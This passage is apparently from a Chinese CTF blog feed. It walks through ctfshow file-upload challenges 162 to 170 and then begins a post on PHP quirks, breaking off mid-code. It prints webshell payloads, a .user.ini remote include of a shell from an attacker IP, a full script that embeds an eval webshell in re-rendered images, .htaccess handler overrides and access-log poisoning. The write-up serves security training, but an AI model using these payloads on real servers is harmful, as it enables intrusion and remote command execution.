alt="image-20240802180342439"></p><p>然后上传图片马的包也是在前面加上GIF头即可, 其余步骤和web160相同</p><h2 id="web162"><a class="header-anchor" href="#web162">¶</a>web162</h2><ul><li>描述: 姿势挺多的啊？啊？</li></ul><p>现在连<code>.</code>都过滤了, <code>.user.ini</code>包含的文件现在不能有任何后缀</p><p>据说是session文件包含, 但是条件竞争是有时间限制的(平台规定), 还是看看我们的远程文件包含吧</p><p>因为不能有数字, 所以用的是长数字IP, <a href="https://www.bejson.com/convert/ip2int/">转换网址</a></p><p>上传远程调用文件, 然后包含即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;http://数字IP/shell&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web163"><a class="header-anchor" href="#web163">¶</a>web163</h2><ul><li>描述: 玉石俱焚</li></ul><p>上传上去的文件似乎马上就被删除了, 现在有两种(?)方法:</p><ol><li>条件竞争上传然后抢在删除之前包含</li><li>远程包含直接在<code>.user.ini</code>里面包含</li></ol><blockquote><p>其实可以让被包含的文件被执行的时候生成一个新的木马?但是也是要条件竞争</p></blockquote><p>还是选择了远程包含, 这次不用再上传其他文件了, 访问<code>/upload/</code>即可</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=http://数字IP/shell</span><br></pre></td></tr></table></figure><h2 id="web164"><a class="header-anchor" href="#web164">¶</a>web164</h2><ul><li>描述: 改头换面</li></ul><p>怎么都上传不上去, 但是在上传正常文件查看后发现有疑似图片包含点:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/download.php?image=xxx.png</span><br></pre></td></tr></table></figure><p>似乎是图片二次渲染上传, <a href="https://blog.csdn.net/2301_79299101/article/details/134295885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172259518716800184112645%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172259518716800184112645&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-134295885-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=%E5%9B%BE%E7%89%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93&amp;spm=1018.2226.3001.4187">解析</a></p><p>上传之后拉下来利用010 Editor对比十六进制, 然后修改相同的地方, 填入一句话木马啥的</p><p>但是我比较懒, 直接用脚本跑更快; <code>php 1.php</code>运行文件, 得到一个新的png</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);<span class="comment">// 要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* &lt;?$_GET[0]($_POST[1]);?&gt; 不用多行注释会导致这里?&gt;有效</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后根据脚本的构造, 执行命令方式如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">&amp;0=system</span><br><span class="line">POST:</span><br><span class="line">1=ls</span><br></pre></td></tr></table></figure><p>但是回显是以图片形式, 没法直接显示在屏幕上, 所以要通过抓包的方式得到回显:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802221327124.png" alt="image-20240802221327124"></p><h2 id="web165"><a class="header-anchor" href="#web165">¶</a>web165</h2><ul><li>描述: 改头换面2.0</li></ul><p>提供的脚本跑了好多次都没跑出来有用的, 暂时放了</p><p>运行方式: <code>php payload.php test.jpg</code>, 其中test.jpg是正常的jpg文件</p><p>传参方式: POST传参且参数为1</p><blockquote><p>先将一个jpg图片上传, 让服务器对其进行一次二次渲染, 我们下载经过二次渲染后的图片, 用渲染后的图片通过脚本来插入payload, 这样被注释掉的概率会降低一点</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>; <span class="comment">//注意$转义</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web166"><a class="header-anchor" href="#web166">¶</a>web166</h2><ul><li>描述: 刻骨铭心</li></ul><p>现在限定是zip文件, 传上去试试, 发现也是疑似包含(download?file=…)</p><p>那么尝试在zip末尾添加一句话木马, 抓下载的包即可执行命令:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802223111282.png" alt="image-20240802223111282"></p><h2 id="web167"><a class="header-anchor" href="#web167">¶</a>web167</h2><ul><li>描述: httpd</li></ul><p>应该是<code>.htaccess</code>中的<code>application/x-httpd-php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 面向所有对应后缀的</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"># 面向特定文件(可行)</span><br><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这次限定的是jpg文件, 将一句话木马修改后缀为jpg后发现可以直接上传</p><p>但是下载文件直接变成了查看文件本体而不是包含文件(我甚至抓不到包), 所以还是得传<code>.htaccess</code>, 记得改改前端代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">lay-data</span>=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;file&#x27;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改一下<code>Content-Type</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802224606418.png" alt="image-20240802224606418"></p><p>现在再访问<code>/upload/shell.jpg</code>应该是一片空白而不是一张图片, 然后就可以命令执行了</p><h2 id="web168"><a class="header-anchor" href="#web168">¶</a>web168</h2><ul><li>描述: 基础免杀</li></ul><p>前端这次限定png, 上传之后没有给上传路径, 但是还是在<code>/upload/1.png</code>中; 然后如果不符合条件, 程序只会返回null</p><p>在抓上传包和改包的时候发现没有限制后缀, 可以传入php文件; 试探了半天发现直接写命令都是无所谓的, 最后在上一层目录中找到另一个flagaa.php, payload如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../flagaa.php`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802230556490.png" alt="image-20240802230556490"></p><h2 id="web169"><a class="header-anchor" href="#web169">¶</a>web169</h2><ul><li>高级免杀</li></ul><p>前端这次限定为zip文件, 但是不管那么多, 抓包测试发现可以直接写php文件, 同时过滤了<code>&lt;</code>; 此时考虑日志包含, 远程文件包含, 配置文件(这里就用配置文件+日志包含了)</p><p>首先, 配置文件生效要求必须有一个主php文件, 而本题没有, 此时可以利用写php文件的上传一个<code>index.php</code>, 此时再访问<code>/upload/</code>就会显示写的php文件</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802231618166.png" alt="image-20240802231618166"></p><p>然后配置文件如下:</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>此时再访问<code>/upload/</code>就可以看到日志文件,  接下来的操作如出一辙, UA头写马然后包含执行命令</p><blockquote><p>不知道哪题可以试下auto_append_file=php://input</p></blockquote><h2 id="web170"><a class="header-anchor" href="#web170">¶</a>web170</h2><ul><li>描述: 终极免杀</li></ul><p>前端限定为zip, 一样没有<code>/upload/</code>, 先试试web169的方法, 发现可以用, 那就结束了</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_php特性_3</title>
      <link href="/article/ctfshow-webbasic-php-3/"/>
      <url>/article/ctfshow-webbasic-php-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>php特性</h1><hr><h2 id="web137"><a class="header-anchor" href="#web137">¶</a>web137</h2><ul><li>描述: 没有难度</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>能利用的点只有<code>call_user_func</code>, <a href="https://www.php.net/manual/zh/function.call-user-func.php">函数详解</a></p><p>在<strong>示例#3</strong>中, 有利用<code>call_user_func</code>来调用一个类里面的方法, 照葫芦画瓢就能拿下payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: </span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h2 id="web138"><a class="header-anchor" href="#web138">¶</a>web138</h2><ul><li>描述: 一丢丢难度</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 